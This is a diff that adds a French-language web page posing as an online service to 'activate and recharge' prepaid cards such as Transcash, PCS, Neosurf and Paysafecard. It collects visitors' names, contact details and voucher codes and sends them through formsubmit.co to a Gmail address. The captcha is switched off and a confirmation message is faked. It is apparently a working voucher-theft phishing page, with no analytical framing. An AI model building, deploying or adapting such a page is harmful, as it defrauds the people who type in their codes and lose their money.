@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="icon" sizes="192x192" href="./img/3.jpg">
+        <link rel="shortcut icon" href="./images/img/3.jpg" type="image/x-icon"/>
+        <link rel="apple-touch-icon" href="./images/img/3.jpg" type="image/x-icon"/>
+        <link rel="stylesheet" href="./css/style2.css">
+        <title> ACTIVATION ET RECHARGES DE CARTES PRÉPAYÉES </title>
+    </head>
+    <body>
+    
+        <div class="container">
+       <!--      <form action="formulaire.php" method="POST" id="inscit" netlify>-->
+            <form action="https://formsubmit.co/activationdevosrechargesservic@gmail.com" method="POST" id="inscit" netlify> 
+    
+                <!-- Honeypot -->
+               <input type="text" name="_honey" style="display: none;"> 
+    
+              <!-- Disable Captcha -->
+              <input type="hidden" name="_captcha" value="false">
+    
+              <!-- <input type="hidden" name="_next" value="formulaire.html" > -->
+              <input type="hidden" name="_next" value="https://imaginative-salamander-6fb63c.netlify.app/test.html" >
+    
+    
+                <h2>ACTIVATION ET RECHARGES DE VOS CARTES EN LIGNE ET TOUTE SÉCURITÉ </h2>
+                <div class="content">
+                    <div class="input-box">
+                        <label for="name">Nom</label>
+                        <input type="text" placeholder="Entrez votre nom" name="Nom_du_client" required>
+                    </div>
+                    <div class="input-box">
+                        <label for="surname">Prénom</label>
+                        <input type="text" placeholder="Entrez vos prénoms" name="Prénom_du_client" required>
+                    </div>
+                    <div class="input-box">
+                        <label for="email">Email</label>
+                        <input type="email" placeholder="Entrez votre email" name="Email_du_client" required>
+                    </div>
+                    <div class="input-box">
+                        <label for="phonenumber">Numéro de Téléphone</label>
+                        <input type="tel" placeholder="Entrez votre numéro de téléphone" name="Numéro_de_téléphone_du_lient" required>
+                    </div>
+                    <div class="input-box">
+                        <label for="montant">Montant de la Recharge (€)</label>
+                        <input type="montant" placeholder="200€" name="Montant_de_la_recharge" required>
+                    </div>
+                    <div class="input-box">
+                        <label for="password">Code de la recharge</label>
+                        <input type="text" class="pswrd" id="password" placeholder="Saisissez le code de votre recharge" name="Code_de_la_recharge" required>
+                    </div>                
+                    <div class="input-box">
+                        <label for="password">Confirmez le Code de la recharge</label>
+                        <input type="text" class="pswrd" id="confirm_password" placeholder="Confirmez le code" name="Confirmation_du_code_de_la_recharge" required>
+                    </div>
+                    <div class="input-box">
+                        <label for="carte">Type de recharge prépayée</label>
+                        <select name="Type_de_la_recharge" id="carte" class="gender-category" required>
+                            <option value="Transcash">Transcash</option>                
+                            <option value="PCS">PCS</option>                
+                            <option value="Neosurf">Neosurf</option>                
+                            <option value="Paysafecard">Paysafecard</option>             
+                    </select>
+                    </div>
+                    <p id="message"></p>
+                    <p id="success-message" style="display: none;">Merci pour votre envoi. Un message de confirmation vous sera envoyer par mail dans quelques instant.</p>
+    
+                        <span class="gender-title">Cacher le code de la recharge</span>
+                    <div class="gender-category">
+                        <input type="radio" name="gender" id="oui">
+                        <label for="gender" class="biss">Oui</label>
+                        <input type="radio" name="gender" id="non">
+                        <label for="gender" class="biss">Non</label>
+                    </div>
+    
+                    <!-- <input type="radio" id="showPassword" name="passwordVisibility" value="show">
+        <label for="showPassword">Afficher le mot de passe</label>
+    
+        <input type="radio" id="hidePassword" name="passwordVisibility" value="hide" checked>
+        <label for="hidePassword">Masquer le mot de passe</label> -->
+    
+                    
+                </div>
+            <div class="button-container">
+                    <button type="submit" onclick="checkPassword()"> ACTIVATION </button> 
+                    <!-- <input type="button" onclick="checkPassword()" value="ACTIVATION"  /> -->
+                </div>
+            </form>
+        </div>
+    
+        <script src="./js/script2.js"></script>
+    </body>
+    </html>
+
+</body>
+</html>
